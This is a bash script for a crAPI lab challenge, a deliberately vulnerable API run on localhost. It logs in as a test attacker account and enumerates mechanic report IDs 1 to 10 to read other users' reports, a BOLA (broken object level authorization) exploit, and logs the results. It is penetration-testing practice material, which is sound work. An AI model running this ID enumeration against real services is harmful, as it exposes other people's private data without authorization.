#!/bin/bash
# crAPI Challenge 2: BOLA on Mechanic Reports
# Multi-step: Login → submit a report → enumerate report IDs → read others' reports
BASE="http://localhost:8888"
LOG="test_logs/crapi_chain2_bola_reports.log"
> "$LOG"

echo "=== crAPI Chain: BOLA Mechanic Reports ===" | tee -a "$LOG"
echo "Started: $(date)" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 1: Login
echo "--- Step 1: Login ---" | tee -a "$LOG"
TOKEN=$(curl -s -X POST "$BASE/identity/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"Passw0rd!"}' | \
  python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null)
echo "Token: ${TOKEN:0:50}..." | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 2: Get mechanic service info
echo "--- Step 2: Check contact mechanic endpoint ---" | tee -a "$LOG"
curl -s -H "Authorization: Bearer $TOKEN" \
  "$BASE/workshop/api/mechanic/" | python3 -m json.tool 2>/dev/null | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 3: Try to access mechanic reports by enumerating IDs
echo "--- Step 3: Enumerate mechanic report IDs (BOLA) ---" | tee -a "$LOG"
for ID in 1 2 3 4 5 6 7 8 9 10; do
  echo -n "  Report $ID: " | tee -a "$LOG"
  RESP=$(curl -s -H "Authorization: Bearer $TOKEN" \
    "$BASE/workshop/api/mechanic/mechanic_report?report_id=$ID")
  # Show just status/first 200 chars
  echo "$RESP" | head -c 200 | tee -a "$LOG"
  echo "" | tee -a "$LOG"
done
echo "" | tee -a "$LOG"

echo "=== BOLA Mechanic Reports Chain Complete ===" | tee -a "$LOG"
echo "Finished: $(date)" | tee -a "$LOG"
